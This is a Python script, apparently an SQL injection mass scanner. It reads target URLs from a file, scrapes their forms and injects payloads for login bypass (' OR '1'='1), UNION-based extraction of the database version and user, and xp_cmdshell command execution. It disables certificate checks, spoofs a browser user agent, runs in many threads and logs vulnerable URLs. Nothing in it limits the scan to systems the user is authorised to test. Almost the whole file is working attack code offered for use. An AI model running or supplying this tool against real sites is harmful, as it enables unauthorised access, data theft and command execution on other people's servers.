import requests
import threading
import time
import warnings
import subprocess
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from colorama import Fore

# Initialize global variables
s = None
checked = 0
thr = 0
delay = 0

def get_all_forms(url):
    r = s.get(url)
    soup = BeautifulSoup(r.content, "lxml")
    return soup.find_all("form")

def get_details(form):
    details = {}
    try:
        act = form.attrs.get("action").lower()
    except:
        act = None

    method = form.attrs.get("method", "get").lower()
    
    inputs = []
    for tag in form.find_all("input"):
        input_type = tag.attrs.get("type", "text")
        input_value = tag.attrs.get("value", "")
        input_name = tag.attrs.get("name")
        inputs.append({"type": input_type, "value": input_value, "name": input_name})
    details["method"] = method
    details["action"] = act
    details["inputs"] = inputs
    return details

def is_vuln(response):
    errors = {
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
    }
    try:
        for e in errors:
            if e in response.content.decode().lower():
                return True
        return False
    except UnicodeDecodeError:
        return False

def check_auth_bypass(url, form_details):
    payloads = ["' OR '1'='1", "' --"]
    for payload in payloads:
        data = {}
        for tag in form_details['inputs']:
            if tag["type"] != "submit":
                data[tag["name"]] = payload
        login_url = urljoin(url, form_details["action"])
        if form_details["method"] == "post":
            r = s.post(login_url, data=data)
        elif form_details["method"] == "get":
            r = s.get(login_url, params=data)
        if "welcome" in r.text.lower() or "dashboard" in r.text.lower():  # Adjust based on your app's response
            print(f"{Fore.GREEN}[CONSOLE] Authentication Bypass vulnerability found! " + login_url)
            with open("vuln.txt", "a+") as f:
                f.write(login_url + "\n")
            return True
    return False

def attempt_data_extraction(url, form_details):
    payloads = ["' UNION SELECT null, version() --", "' UNION SELECT null, user() --"]
    for payload in payloads:
        data = {}
        for tag in form_details['inputs']:
            if tag["type"] != "submit":
                data[tag["name"]] = payload
        data_extraction_url = urljoin(url, form_details["action"])
        if form_details["method"] == "post":
            r = s.post(data_extraction_url, data=data)
        elif form_details["method"] == "get":
            r = s.get(data_extraction_url, params=data)
        if "root" in r.text.lower() or "version" in r.text.lower():  # Adjust based on your app's response
            print(f"{Fore.GREEN}[CONSOLE] Data Extraction vulnerability found! " + data_extraction_url)
            with open("vuln.txt", "a+") as f:
                f.write(data_extraction_url + "\n")
            return True
    return False

def check_command_execution(url, form_details):
    payloads = ["'; exec xp_cmdshell('dir'); --", "'; exec xp_cmdshell('whoami'); --"]
    for payload in payloads:
        data = {}
        for tag in form_details['inputs']:
            if tag["type"] != "submit":
                data[tag["name"]] = payload
        command_exec_url = urljoin(url, form_details["action"])
        if form_details["method"] == "post":
            r = s.post(command_exec_url, data=data)
        elif form_details["method"] == "get":
            r = s.get(command_exec_url, params=data)
        if "directory" in r.text.lower() or "user" in r.text.lower():  # Adjust based on your app's response
            print(f"{Fore.GREEN}[CONSOLE] Command Execution vulnerability found! " + command_exec_url)
            with open("vuln.txt", "a+") as f:
                f.write(command_exec_url + "\n")
            return True
    return False

def scan_sql_inj(url):
    with open("vuln.txt", "a+") as f:
        for b in "\"'":
            new_url = f"{url}{b}"
            print(f"{Fore.WHITE}[CONSOLE] Trying: {new_url}")
            r = s.get(new_url)
            if is_vuln(r):
                print(f"{Fore.GREEN}[CONSOLE] Found SQL injection vulnerability! " + new_url.strip(f"{b}"))
                f.write(new_url.strip(f"{b}") + "\n")
                return

        forms = get_all_forms(url)
        print(f"{Fore.CYAN}[CONSOLE] Detected {len(forms)} forms on {url}")
        for form in forms:
            form_details = get_details(form)
            if check_auth_bypass(url, form_details):
                continue
            if attempt_data_extraction(url, form_details):
                continue
            if check_command_execution(url, form_details):
                continue
            for b in "\"'":
                data = {}
                for tag in form_details['inputs']:
                    if tag["type"] == "hidden" or tag["value"]:
                        data[tag["name"]] = tag["value"] + b
                    elif tag["type"] != "submit":
                        data[tag["name"]] = f"test{b}"
                form_url = urljoin(url, form_details["action"])
                if form_details["method"] == "post":
                    r = s.post(form_url, data=data)
                elif form_details["method"] == "get":
                    r = s.get(form_url, params=data)

                if is_vuln(r):
                    f.write(form_url.strip(f"{b}") + "\n")
                    print(f"{Fore.GREEN}[CONSOLE] Found SQL injection vulnerability! " + form_url.strip(f"{b}"))
                    return

def start_scan():
    global checked
    try:
        threads = []
        with open('urls.txt', 'r') as f:
            urls = f.readlines()
            for _ in range(thr):
                if checked < len(urls):
                    for url in urls:
                        time.sleep(delay)
                        t = threading.Thread(target=scan_sql_inj, args=(url.strip(),))
                        t.start()
                        checked += 1
                        threads.append(t)

                    for t in threads:
                        t.join()

    except FileNotFoundError:
        print(f"{Fore.RED}[CONSOLE] please create a urls.txt file and add the URLs to it.")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[CONSOLE] Request Exception: {e}")

def start_sql_():
    global thr, delay, s
    subprocess.call('clear', shell=True)

    print(f"""{Fore.CYAN}
  ██████   █████   ██▓       ▄▄▄█████▓▓█████   ██████ ▄▄▄█████▓▓█████  ██▀███  
▒██    ▒ ▒██▓  ██▒▓██▒       ▓  ██▒ ▓▒▓█   ▀ ▒██    ▒ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▒██▒  ██░▒██░       ▒ ▓██░ ▒░▒███   ░ ▓██▄   ▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
  ▒   ██▒░██  █▀ ░▒██░       ░ ▓██▓ ░ ▒▓█  ▄   ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒░▒███▒█▄ ░██████▒     ▒██▒ ░ ░▒████▒▒██████▒▒  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░     ▒ ░░   ░░ ▒░ ░▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░       ░     ░ ░  ░░ ░▒  ░ ░    ░     ░ ░  ░  ░▒ ░ ▒░
░  ░  ░     ░   ░   ░ ░        ░         ░   ░  ░  ░    ░         ░     ░░   ░ 
      ░      ░        ░  ░               ░  ░      ░              ░  ░   ░     

    """)

    thr = int(input(f'{Fore.BLUE}[CONSOLE] Please enter threads number (30 for best results): '))
    delay = int(input(f'{Fore.BLUE}[CONSOLE] Please enter delay (enter 0 to skip): '))
    time.sleep(1)
    subprocess.call('clear', shell=True)

    warnings.filterwarnings('ignore', message='Unverified HTTPS request')

    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
    s.verify = False
    
    start_scan()

# Start the SQL injection scanner
start_sql_()
